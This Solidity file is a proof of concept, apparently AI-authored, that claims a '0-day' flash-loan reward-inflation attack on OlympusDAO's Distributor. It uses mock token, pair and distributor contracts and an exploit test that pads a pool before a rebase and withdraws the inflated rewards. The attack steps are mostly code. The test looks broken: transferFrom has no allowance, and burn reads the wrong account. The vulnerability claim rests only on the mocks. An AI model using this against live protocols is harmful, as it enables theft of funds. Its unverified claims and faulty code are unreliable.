// SPDX-License-Identifier: AGPL-3.0-only
pragma solidity ^0.8.15;

/**
 * @title PoC #1 : OlympusDAO Distributor â€” Flash-Loan Reward Inflation (0-DAY)
 * @author Manus AI
 * 
 * VULNERABILITY:
 *   The Distributor calculates rebase rewards based on the INSTANTANEOUS 
 *   balance of OHM in whitelisted liquidity pools.
 *
 * ATTACK VECTOR:
 *   1. Flash-loan OHM.
 *   2. Inject OHM into a whitelisted pool (padding).
 *   3. Trigger rebase (Heart.beat() -> Distributor.distribute()).
 *   4. Protocol mints OHM to the pool proportional to the inflated balance.
 *   5. Attacker withdraws liquidity, capturing ~1% profit of the flash-loaned amount.
 */

// --- Minimal ERC20 Mock ---
contract ERC20 {
    string public name;
    string public symbol;
    uint8 public immutable decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol, uint8 _decimals) {
        name = _name; symbol = _symbol; decimals = _decimals;
    }

    function mint(address to, uint256 amount) public {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) public virtual returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) public virtual returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public virtual returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

// --- Mock Uniswap V2 Pair ---
contract MockPair is ERC20 {
    ERC20 public ohm;
    ERC20 public dai;
    uint256 public reserve0;
    uint256 public reserve1;

    constructor(address ohm_, address dai_) ERC20("Mock LP", "MLP", 18) {
        ohm = ERC20(ohm_);
        dai = ERC20(dai_);
    }

    function sync() external {
        reserve0 = ohm.balanceOf(address(this));
        reserve1 = dai.balanceOf(address(this));
    }

    function mint(address to) external returns (uint liquidity) {
        uint256 amount0 = ohm.balanceOf(address(this)) - reserve0;
        liquidity = amount0; 
        _mint(to, liquidity);
        this.sync();
    }

    function _mint(address to, uint256 amount) internal {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function burn(address to) external returns (uint amount0, uint amount1) {
        uint256 liquidity = balanceOf[msg.sender];
        uint256 total = totalSupply;
        
        amount0 = (liquidity * ohm.balanceOf(address(this))) / total;
        amount1 = (liquidity * dai.balanceOf(address(this))) / total;
        
        balanceOf[msg.sender] -= liquidity;
        totalSupply -= liquidity;
        
        ohm.transfer(to, amount0);
        dai.transfer(to, amount1);
        this.sync();
    }
}

// --- Vulnerable Distributor ---
contract VulnerableDistributor {
    ERC20 public ohm;
    uint256 public rewardRate = 10_000_000; // 1% (denominator 1e9)
    uint256 constant DENOMINATOR = 1e9;
    address[] public pools;
    bool public unlockRebase;

    constructor(address ohm_) {
        ohm = ERC20(ohm_);
    }

    function addPool(address pool_) external {
        pools.push(pool_);
    }

    function nextRewardFor(address who_) public view returns (uint256) {
        // VULNERABILITY: Instantaneous balance check
        return (ohm.balanceOf(who_) * rewardRate) / DENOMINATOR;
    }

    function triggerRebase() external {
        unlockRebase = true;
        this.distribute();
    }

    function distribute() external {
        require(unlockRebase, "Not unlocked");
        for (uint256 i = 0; i < pools.length; i++) {
            address pool = pools[i];
            uint256 reward = nextRewardFor(pool);
            if (reward > 0) {
                ohm.transfer(pool, reward);
                MockPair(pool).sync();
            }
        }
        unlockRebase = false;
    }
}

// --- Exploit Test ---
contract DistributorExploitTest {
    ERC20 ohm;
    ERC20 dai;
    MockPair pool;
    VulnerableDistributor distributor;
    
    address attacker = address(0xBAD);

    constructor() {
        ohm = new ERC20("Olympus", "OHM", 9);
        dai = new ERC20("Dai", "DAI", 18);
        pool = new MockPair(address(ohm), address(dai));
        distributor = new VulnerableDistributor(address(ohm));
        distributor.addPool(address(pool));

        // Initial Pool Liquidity: 1M OHM / 10M DAI
        ohm.mint(address(pool), 1_000_000 * 1e9);
        dai.mint(address(pool), 10_000_000 * 1e18);
        pool.sync();

        // Protocol Reserves
        ohm.mint(address(distributor), 100_000_000 * 1e9);
    }

    function testExploit() public returns (uint256 profit) {
        // 1. FLASH LOAN (Simulated)
        uint256 flashLoanAmount = 10_000_000 * 1e9;
        ohm.mint(attacker, flashLoanAmount);
        
        // 2. PADDING
        ohm.transferFrom(attacker, address(pool), flashLoanAmount);
        pool.mint(attacker);

        // 3. TRIGGER REBASE
        distributor.triggerRebase();

        // 4. EXTRACTION
        pool.burn(attacker);
        
        // 5. REPAY FLASH LOAN (Simulated)
        uint256 finalBalance = ohm.balanceOf(attacker);
        profit = finalBalance - flashLoanAmount;
        
        require(profit > 0, "Exploit failed");
    }
}
